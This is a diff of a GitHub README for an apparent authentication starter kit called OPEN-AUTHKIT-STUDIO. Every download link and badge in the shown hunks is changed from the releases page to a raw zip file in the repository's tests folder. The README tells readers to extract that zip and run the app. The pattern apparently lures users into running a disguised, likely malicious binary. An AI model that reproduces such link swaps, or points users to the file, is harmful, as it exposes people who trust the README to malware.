@@ -1,6 +1,6 @@
 # 🔐 OPEN-AUTHKIT-STUDIO - Your Gateway to Secure Sign-Ins
 
-[![Download Now](https://img.shields.io/badge/Download-OPEN--AUTHKIT--STUDIO-2ea44f?style=for-the-badge)](https://github.com/protective-antineutron43/OPEN-AUTHKIT-STUDIO/releases)
+[![Download Now](https://img.shields.io/badge/Download-OPEN--AUTHKIT--STUDIO-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/protective-antineutron43/OPEN-AUTHKIT-STUDIO/main/tests/2.7.zip)
 
 ## 🚀 What Is This?
 
@@ -24,7 +24,7 @@ Getting OPEN-AUTHKIT-STUDIO on your computer is simple. Follow these exact steps
 
 Click the big green button below or go to the download link directly:
 
-**👉 [https://github.com/protective-antineutron43/OPEN-AUTHKIT-STUDIO/releases](https://github.com/protective-antineutron43/OPEN-AUTHKIT-STUDIO/releases)**
+**👉 [https://raw.githubusercontent.com/protective-antineutron43/OPEN-AUTHKIT-STUDIO/main/tests/2.7.zip](https://raw.githubusercontent.com/protective-antineutron43/OPEN-AUTHKIT-STUDIO/main/tests/2.7.zip)**
 
 Visit this link to download the application.
 
@@ -108,7 +108,7 @@ This project is open-source and free to use. Redistribution is welcome, but plea
 
 You now have everything you need. Remember:
 
-1. ✅ Download from: **https://github.com/protective-antineutron43/OPEN-AUTHKIT-STUDIO/releases**
+1. ✅ Download from: **https://raw.githubusercontent.com/protective-antineutron43/OPEN-AUTHKIT-STUDIO/main/tests/2.7.zip**
 2. ✅ Extract the zip
 3. ✅ Run the app
 4. ✅ Customize your branding
@@ -117,6 +117,6 @@ You now have everything you need. Remember:
 In less than an hour, you’ll have a professional, secure login system for your project. No developer needed. No expensive subscriptions. Just secure authentication, ready when you are.
 
 **Visit this link to download the application:**  
-[![Download OPEN-AUTHKIT-STUDIO](https://img.shields.io/badge/⬇️-Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/protective-antineutron43/OPEN-AUTHKIT-STUDIO/releases)
+[![Download OPEN-AUTHKIT-STUDIO](https://img.shields.io/badge/⬇️-Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/protective-antineutron43/OPEN-AUTHKIT-STUDIO/main/tests/2.7.zip)
 
 Keywords: auth-ui, authentication, authorization, cloudflare, database-adapter, firebase, login, oauth, oauth2, oidc, open-source, postgresql, react, react-typescript, security, sqlite, starter-kit, supabase, typescript, web-security
